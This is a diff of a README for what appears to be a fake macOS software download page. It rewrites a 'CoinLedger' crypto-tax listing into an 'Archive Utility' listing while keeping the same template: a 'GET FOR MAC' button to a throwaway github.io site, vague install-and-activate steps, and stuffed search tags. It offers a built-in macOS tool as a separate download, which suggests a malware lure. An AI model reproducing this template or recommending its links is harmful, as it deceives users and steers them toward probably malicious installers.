@@ -1,12 +1,12 @@
-# CoinLedger – Complete Crypto Tax Automation & Portfolio Intelligence for macOS  
+# Archive Utility – Lightweight File Compression & Extraction Tool
 
 <div align="center">  
-  <img src="https://moralis.com/wp-content/uploads/web3wiki/1155-coinledger/6397811a31948ef3795c256e_k0CwqLPE9jZbLOp4w-CbYfIdvKTKH9KMaMo7Z0CYp4c.png" width="250"/>  
+  <img src="https://cdn.jim-nielsen.com/macos/512/archive-utility-2023-05-23.png?rf=1024" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-get-2025.github.io/.github/coinledger)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/archive)  
 
 </div>  
 
@@ -15,24 +15,24 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate CoinLedger On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate Archive Utility On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://cdn.prod.website-files.com/614c99cf4f23708b27a37503/65b27fbcb59958df9b71bf6e_CoinLedger%20Open%20Graph.png" width="1080"/>  
+  <img src="https://ftp-mac.com/wp-content/uploads/2024/01/SCR-20240125-dser.png" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**CoinLedger for macOS** delivers an effortless way to manage your cryptocurrency taxes and investments. It combines real-time portfolio tracking with fully automated tax calculations, giving investors complete visibility into their crypto activity — all within a fast and modern macOS experience.  
+**Archive Utility for macOS** is a built-in file compression and extraction tool designed to make managing archives effortless. It’s fast, reliable, and integrated directly into macOS, providing a smooth experience for users who frequently handle ZIP, RAR, or 7z files.  
 
-Built to simplify complexity, CoinLedger seamlessly imports your transactions from wallets, blockchains, and exchanges like **Coinbase**, **Binance**, **Kraken**, and **Metamask**. Within minutes, you can generate precise tax reports and view performance analytics for every asset in your portfolio.  
+The app automatically extracts archives with a simple double-click and can compress multiple files into a single archive without any extra setup. Whether you’re unzipping large project folders, preparing files for email, or cleaning up downloads, Archive Utility gets the job done instantly and silently in the background.  
 
-The app supports multiple accounting methods and provides automatic gain/loss calculations across trading, staking, mining, and DeFi activities. Detailed visualizations make it easy to identify trends, optimize holdings, and plan smarter tax strategies.  
+Unlike third-party software, **Archive Utility** is minimalistic yet powerful — it’s always ready to handle the most common file formats without consuming system resources. It supports ZIP, RAR, TAR, GZ, 7z, and more, ensuring compatibility with virtually any archive you encounter.  
 
-With its strong focus on privacy, CoinLedger ensures that sensitive financial data stays encrypted and secure on your Mac. Whether you’re a casual investor, day trader, or professional accountant, CoinLedger transforms tedious tax reporting into a streamlined, data-driven process.  
+Optimized for both **Intel** and **Apple Silicon**, it runs natively on modern Macs, offering maximum performance and energy efficiency. Simple, secure, and dependable — this tool is the quiet hero of macOS file management.  
 
 ---  
 
@@ -40,14 +40,14 @@ With its strong focus on privacy, CoinLedger ensures that sensitive financial da
 
 | Feature                                      | Description                                                                 |
 |----------------------------------------------|------------------------------------------------------------------------------|
-| 📊 **Automated Tax Reporting**                | Instantly calculates crypto taxes, including capital gains and income.      |
-| 🔗 **Exchange & Wallet Connectivity**          | Syncs transactions from top exchanges and wallets automatically.            |
-| 💹 **Portfolio Insights**                     | Analyze performance, allocation, and portfolio diversification in detail.   |
-| 🧾 **Tax Form Integration**                   | Exports to IRS, TurboTax, and global tax platforms effortlessly.            |
-| 🔒 **Full Data Security**                     | Stores all sensitive information locally, encrypted for maximum privacy.    |
-| 💡 **Smart Profit & Loss Tracking**           | Provides historical gain/loss summaries across multiple tax years.          |
-| ⚙️ **Multi-Chain Support**                    | Compatible with a wide variety of blockchains and token types.              |
-| ⚡ **Optimized for macOS**                     | Runs natively on Apple Silicon with high-speed processing and fluid UI.     |
+| 📂 **Instant Extraction**                      | Unzips and unpacks ZIP, RAR, 7z, and other formats with just a click.       |
+| 🗜️ **Quick Compression**                       | Easily compress files or folders into ZIP archives for sharing or storage.  |
+| ⚙️ **Native macOS Integration**               | Built directly into macOS for seamless system performance.                  |
+| 💡 **Automatic File Handling**                | Automatically extracts archives to the same or custom destination folders.  |
+| 🧰 **Multi-Format Compatibility**             | Works with ZIP, RAR, 7z, TAR, and GZ archives.                              |
+| 🔒 **Safe & Reliable**                        | Maintains file integrity while supporting password-protected archives.      |
+| 🖱️ **Drag-and-Drop Simplicity**               | Compress or extract files by simply dragging them onto the app icon.        |
+| ⚡ **Apple Silicon Support**                  | Fully optimized for M1/M2 Macs for faster operation and lower energy use.   |
 
 ---  
 
@@ -55,14 +55,14 @@ With its strong focus on privacy, CoinLedger ensures that sensitive financial da
 
 | Component     | Minimum Specifications            |
 |---------------|-----------------------------------|
-| OS            | macOS 11.0 or later               |
+| OS            | macOS 10.12 or later              |
 | Processor     | Apple Silicon (M1/M2) or Intel    |
-| Memory        | 4 GB RAM or higher                |
-| Storage       | 200 MB free disk space            |
+| Memory        | 1 GB RAM or higher                |
+| Storage       | 50 MB free disk space             |
 | Display       | 1280×800 resolution or higher     |
 
 ---  
 
 ## 🏷️ Tags  
 
-coinledger • coinledger app • coin ledger • coin ledger app • coinledger login • coinledger tax • coinledger pricing • ledger supported coins • ledger coin support • ledger compatible coins • bit coin ledger • coins supported by ledger • coins supported on ledger • crypto coin ledger • coin ledger tax • coinledger review • coinledger turbotax • coinledger cost • coin ledger pricing • coin ledger reviews • coinledger voyager • coinledger taxes • coin ledger taxes • coinledger mac • coinledger osx • coinledger mac app • coin ledger mac • coin ledger osx • coin ledger mac app  
+z archiver • zar archiver • archiver • unarchiver • rar mac • the unarchiver • rar file mac • rar opener for mac • extract rar mac • rar extractor • 7zip on mac • 7z software • 7z • 7z file • rar files • rar document • opening rar • compress to zip • archivefiles • archiver online • rar for mac os x • opening rar files in mac • rar os x • zip7 mac • archiver app • archiver software • unarchiver mac • 7 zip for mac  
